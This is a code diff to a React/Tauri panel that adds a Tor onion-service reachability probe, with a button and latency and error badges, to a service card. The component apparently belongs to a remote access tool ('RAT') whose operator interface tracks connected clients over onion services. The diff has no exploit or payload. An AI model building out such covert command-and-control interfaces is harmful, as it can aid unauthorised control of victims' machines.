@@ -8,11 +8,14 @@ import {
   IconUsers,
   IconWorld,
   IconLoader2,
+  IconRadar,
+  IconCheck,
+  IconX,
 } from "@tabler/icons-react";
 import toast from "react-hot-toast";
 import { listen } from "@tauri-apps/api/event";
 import { RATContext } from "../rat/RATContext";
-import { initTorCmd, createOnionCmd, deleteOnionCmd } from "../rat/RATCommands";
+import { initTorCmd, createOnionCmd, deleteOnionCmd, checkOnionReachabilityCmd } from "../rat/RATCommands";
 import { OnionServiceInfo, RATClient } from "../../types";
 
 // ─── helpers ──────────────────────────────────────────────────────────────────
@@ -51,6 +54,13 @@ const SkeletonCard = () => (
 
 // ─── Service card ─────────────────────────────────────────────────────────────
 
+// Reachability probe result for a single service
+type ReachabilityResult =
+  | { state: "idle" }
+  | { state: "probing" }
+  | { state: "ok"; latencyMs: number }
+  | { state: "fail"; error: string };
+
 interface ServiceCardProps {
   info: OnionServiceInfo;
   connectedClients: RATClient[];
@@ -69,6 +79,18 @@ const ServiceCard = ({
   const fullAddress = info.onion_address.endsWith(".onion")
     ? info.onion_address
     : `${info.onion_address}.onion`;
+
+  const [reachability, setReachability] = useState<ReachabilityResult>({ state: "idle" });
+
+  const handleProbe = async () => {
+    setReachability({ state: "probing" });
+    try {
+      const latencyMs = await checkOnionReachabilityCmd(fullAddress, info.port);
+      setReachability({ state: "ok", latencyMs });
+    } catch (e: any) {
+      setReachability({ state: "fail", error: String(e) });
+    }
+  };
 
   return (
     <div className="group rounded-2xl border border-accentx bg-secondarybg p-5 flex flex-col gap-4 transition hover:border-white/20">
@@ -121,6 +143,39 @@ const ServiceCard = ({
         >
           <IconCopy size={14} />
         </button>
+      </div>
+
+      {/* Reachability probe */}
+      <div className="flex items-center gap-2">
+        <button
+          onClick={handleProbe}
+          disabled={reachability.state === "probing"}
+          className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl border border-accentx text-accenttext hover:text-white hover:border-white/30 transition text-xs disabled:opacity-50 cursor-pointer"
+          title="Test whether this onion service is reachable on the Tor network"
+        >
+          {reachability.state === "probing" ? (
+            <IconLoader2 size={13} className="animate-spin" />
+          ) : (
+            <IconRadar size={13} />
+          )}
+          <span>{reachability.state === "probing" ? "Probing…" : "Test Reachability"}</span>
+        </button>
+
+        {reachability.state === "ok" && (
+          <span className="flex items-center gap-1 text-xs text-green-400 bg-green-500/10 border border-green-500/30 px-2 py-0.5 rounded-full">
+            <IconCheck size={11} />
+            Reachable · {reachability.latencyMs} ms
+          </span>
+        )}
+        {reachability.state === "fail" && (
+          <span
+            className="flex items-center gap-1 text-xs text-red-400 bg-red-500/10 border border-red-500/30 px-2 py-0.5 rounded-full max-w-[180px] truncate"
+            title={reachability.error}
+          >
+            <IconX size={11} />
+            Unreachable
+          </span>
+        )}
       </div>
 
       {/* Connected clients */}
